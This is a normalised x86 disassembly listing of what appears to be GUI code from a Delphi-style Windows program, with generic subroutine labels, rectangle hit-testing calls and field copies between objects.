mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x2
mov al 0x1
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov dl [ edx + 0x2b6 ]
cmp al dl
je r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x348 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp dl 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xa ] 0x1
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x348 ]
mov edx esi
call sub_4143bc
cmp [ eax + 0xe0 ] 0x0
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ eax + 0x8e ] 0x0
jne r-xdata
cmp [ eax + 0x8e ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_48931c
pop ecx
sub_48952c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x9 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_443e1c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x284 ]
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x26c ]
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x10 ]
jne r-xdata
push ebp
call sub_4893b0
pop ecx
test al al
jne r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_412edc
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_477e28
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_477e28
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ eax + 0x268 ]
mov eax [ ebp - 0x4 ]
call sub_44275c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x10 ]
jne r-xdata
mov [ ebp - 0xa ] 0x0
mov eax ebx
call sub_478868
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x368 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
push ebp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov al 0x1
call sub_489478
pop ecx
push ebp
mov ecx [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
call sub_489478
pop ecx
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x14 ] eax
cmp [ ebp - 0xa ] 0x0
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4 ]
call sub_48864c
mov eax [ ebp - 0x4 ]
lea esi [ ebp - 0x60 ]
lea edi [ eax + 0x369 ]
mov ecx 0x13
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x368 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_4896c0
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
call sub_442efc
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4896e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov eax [ edi + 0x348 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
xor esi esi
inc esi
dec ebp
jne r-xdata
fld [ eax + 0x10 ]
fsub [ eax + 0x18 ]
fmul [ r-xdata ]
fld [ r-xdata ]
fmulp st1
fstp [ esp ]
fwait
test bl bl
jne r-xdata
mov eax [ edi + 0x348 ]
mov edx esi
call sub_4143bc
cmp [ eax + 0x8e ] 0x0
jne r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
xor edx edx
call sub_47cef8
fld [ esp ]
fchs
fstp [ esp ]
fwait
sub_48976a
add [ eax ] al
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov esi eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax esi
call sub_442fc0
mov ebx eax
mov dl 0x1
mov eax esi
call sub_4896e8
mov eax ebx
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_4897a4
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov esi eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax esi
call sub_44300c
mov ebx eax
xor edx edx
mov eax esi
call sub_4896e8
mov eax ebx
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_489808
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x284 ]
mov eax esi
call sub_478868
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x2f0 ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x2f0 ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x2f4 ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x2f4 ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x14 ]
mov eax [ ebx + 0x2f8 ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0xc ]
mov eax [ ebx + 0x2f8 ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x14 ]
mov eax [ ebx + 0x2fc ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0xc ]
mov eax [ ebx + 0x2fc ]
call sub_47b578
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_488d14
pop esi
pop ebx
retn
sub_4898cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_443ec4
mov eax ebx
call sub_484c5c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x284 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x26c ]
mov [ eax + 0x4 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov dl [ ebp - 0x1 ]
cmp dl [ rw-data ]
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_483fd0
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov edi [ eax ]
call [ edi + 0x120 ]
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
mov esi eax
mov [ esi + 0x4 ] 0x0
mov eax ebx
call sub_477e28
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0xc ]
mov dl 0x4
call sub_41d7a0
mov eax [ ebp + 0xc ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x10 ]
sub eax [ esi + 0x8 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x10
jle r-xdata
mov eax [ esi + 0x14 ]
sub eax [ esi + 0xc ]
cdq
xor eax edx
sub eax edx
cmp eax 0x10
jle r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ esi + 0x8 ]
jle r-xdata
mov eax ebx
mov si 0xffb3
call sub_403540
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0xc ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x118 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4899d4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx eax
mov eax [ ebx + 0x348 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_483fe8
cmp [ ebx + 0x278 ] 0x0
je r-xdata
inc esi
xor edi edi
mov eax ebx
call sub_477d94
lea esi [ ebx + 0x28e ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x348 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x27c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x348 ]
call sub_4143bc
call sub_47be28
inc edi
dec esi
jne r-xdata
mov esi esp
lea edi [ ebx + 0x28e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_477d94
mov eax [ ebx + 0x348 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
cmp [ ebx + 0x300 ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
push esi
push edi
lea esi [ esp + 0x8 ]
lea edi [ esp + 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
cmp edi 0x5
setl cl
lea edx [ esp + 0x10 ]
mov eax ebp
call sub_47effc
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call IntersectRect
test eax eax
je r-xdata
xor edi edi
mov eax [ ebx + 0x354 ]
mov edi [ eax + 0x14 ]
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x348 ]
call sub_4143bc
call sub_47d414
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ ebx + 0x348 ]
call sub_4143bc
mov ebp eax
mov edx ebp
mov eax ebx
call sub_483960
test al al
je r-xdata
push esi
push edi
lea esi [ esp + 0x18 ]
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebx + 0x28e ]
mov eax [ ebx + 0x280 ]
cdq
xor eax edx
sub eax edx
add eax edi
sub [ ecx + 0x8 ] eax
mov eax [ ebx + 0x254 ]
cdq
xor eax edx
sub eax edx
add edi eax
add [ ecx + 0x4 ] edi
sub_489b2c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x20 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412f04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_484c5c
mov esi eax
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_47bd24
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x138 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x134 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_476954
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
call sub_476954
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_476954
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
call sub_476954
mov [ ebp - 0x18 ] eax
jmp r-xdata
sub_489c3c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f0 ]
call sub_489b2c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_489b2c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2fc ]
call sub_489b2c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_489b2c
pop ecx
pop ecx
pop ebp
retn
sub_489c88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_484c70
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x350 ]
mov [ ebx + 0x350 ] al
mov edx [ edi + 0x354 ]
mov eax [ ebx + 0x354 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x358 ]
mov eax [ ebx + 0x358 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x360 ]
mov eax [ ebx + 0x360 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x364 ]
mov eax [ ebx + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x35c ]
mov eax [ ebx + 0x35c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x3b8 ]
mov eax [ ebx + 0x3b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_489d2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx [ edx + 0x30 ]
mov eax ebx
call sub_480d20
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_480d20
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
call sub_480d20
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov edx esi
call sub_48056c
mov edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_489d98
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_484c5c
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x2e8 ]
mov edx ebx
call sub_4834ec
jmp r-xdata
mov edx ebx
mov eax edi
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_489dd8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_478778
mov [ esi + 0x5c ] 0x1
mov [ esi + 0xc ] 0x1
mov [ esi + 0x64 ] 0x0
mov [ esi + 0x30 ] 0xa
mov [ esi + 0x14 ] 0xffffff
mov eax esi
call sub_48a14c
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472a2c
mov [ esi + 0x24 ] eax
mov [ esi + 0x50 ] 0x1
mov [ esi + 0x2d ] 0x0
mov [ esi + 0x18 ] 0xc
mov [ esi + 0x54 ] 0xa
mov [ esi + 0x44 ] 0x1
xor eax eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] 0x3
mov eax esi
call sub_48a14c
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472ad8
mov [ esi + 0x1c ] eax
mov eax esi
call sub_48a14c
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_487970
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_489eb0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x1c ]
call sub_403344
mov eax [ esi + 0x24 ]
call sub_403344
mov eax [ esi + 0x10 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4787e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_489ef0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_478814
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x5c ]
mov [ ebx + 0x5c ] al
mov al [ edi + 0x2d ]
mov [ ebx + 0x2d ] al
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov al [ edi + 0xc ]
mov [ ebx + 0xc ] al
mov al [ edi + 0x50 ]
mov [ ebx + 0x50 ] al
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
mov eax [ edi + 0x28 ]
mov [ ebx + 0x28 ] eax
mov eax [ edi + 0x58 ]
mov [ ebx + 0x58 ] eax
mov al [ edi + 0x44 ]
mov [ ebx + 0x44 ] al
mov al [ edi + 0x2c ]
mov [ ebx + 0x2c ] al
mov eax [ edi + 0x54 ]
mov [ ebx + 0x54 ] eax
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x30 ]
mov [ ebx + 0x30 ] eax
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_489fe0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_48a04c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
cmp ebx 0x64
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a053
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax esi
call sub_48a14c
lea edx [ esi + 0x54 ]
mov ecx ebx
call sub_477b34
sub_48a058
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48a0bf
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jge r-xdata
mov eax ebx
call sub_48a14c
lea edx [ ebx + 0x20 ]
mov ecx esi
call sub_477aa8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a0c6
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_48a194
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_48a200
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
cmp ebx 0x64
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a207
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax esi
call sub_48a14c
lea edx [ esi + 0x18 ]
mov ecx ebx
call sub_477b34
sub_48a20c
push ebx
mov ebx eax
mov al [ ebx + 0x2d ]
test al al
jne r-xdata
mov [ ebx + 0x64 ] al
mov eax ebx
call sub_48a14c
mov eax [ eax + 0x2e8 ]
call sub_483500
dec eax
jle r-xdata
mov [ ebx + 0x64 ] 0x2
pop ebx
retn
mov [ ebx + 0x64 ] 0x1
jmp r-xdata
pop ebx
retn
sub_48a23c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_48a14c
mov esi eax
mov al [ ebx + 0x64 ]
dec al
je r-xdata
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_483e14
jmp r-xdata
dec al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
push eax
mov eax esi
call sub_489d98
mov edx eax
mov ecx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
push eax
mov edx edi
mov eax esi
call sub_483fd0
call sub_481f8c
dec eax
push eax
mov edx edi
mov eax esi
call sub_483fd0
mov edx eax
mov eax esi
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
sub_48a300
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_48a14c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x8 ]
jle r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_41d7e4
add eax eax
push eax
mov eax esi
pop edx
sub eax edx
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x8 ]
add eax edi
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0xc ]
cdq
idiv ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_48a3d0
mov edx eax
mov eax ebx
call sub_47695c
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_48a374
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_48a14c
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_48a534
test al al
je r-xdata
push ebp
xor ecx ecx
mov edx [ ebx + 0x240 ]
mov eax [ ebx + 0x296 ]
call sub_48a300
pop ecx
push ebp
mov ecx [ ebx + 0x292 ]
mov edx [ ebx + 0x244 ]
mov eax [ ebx + 0x29a ]
call sub_48a300
pop ecx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_48a3d0
push ebx
push esi
push edi
push ebp
mov ebx eax
xor edi edi
mov al [ ebx + 0x64 ]
cmp al 0x1
je r-xdata
mov eax ebx
call sub_48a14c
call sub_484c5c
mov esi eax
dec esi
test esi esi
jl r-xdata
cmp al 0x3
jne r-xdata
sub edi [ ebx + 0x20 ]
jmp r-xdata
inc esi
xor ebp ebp
mov eax ebx
call sub_48a14c
call sub_489d98
mov esi eax
test esi esi
je r-xdata
mov edx edi
xor eax eax
call sub_476954
mov edi eax
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec esi
jne r-xdata
cmp [ eax + 0x70 ] 0x0
je r-xdata
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov eax ebx
call sub_48a14c
mov edx ebp
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc edi
mov eax esi
mov edx [ eax ]
call [ edx + 0x9c ]
mov edi eax
sub edi [ ebx + 0x20 ]
sub_48a458
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_48a4f4
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov edi [ ebx + 0x20 ]
add edi [ ebp - 0x4 ]
dec edi
mov eax ebx
call sub_48a3d0
mov edi eax
add edi [ ebx + 0x20 ]
dec edi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a4fb
lea eax [ ebp - 0x10 ]
call sub_404094
retn
inc ebx
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_48a14c
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x20 ]
mov ebx edi
sub ebx eax
jl r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4885d0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax esi
call sub_476954
mov esi eax
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_48a504
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx [ ebp + 0x8 ]
mov ecx edx
sub ecx [ eax + 0x60 ]
mov [ ebx ] ecx
add ecx [ eax + 0x60 ]
mov [ ebx + 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x2
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x2
mov [ ebx + 0xc ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_48a548
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48a7c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a7ce
lea eax [ ebp - 0x14 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_48a14c
mov ebx eax
mov esi [ ebx + 0x288 ]
xor edx edx
mov eax [ esi + 0x10 ]
call sub_41dae4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x14 ]
mov eax [ esi + 0x10 ]
call sub_41d9c8
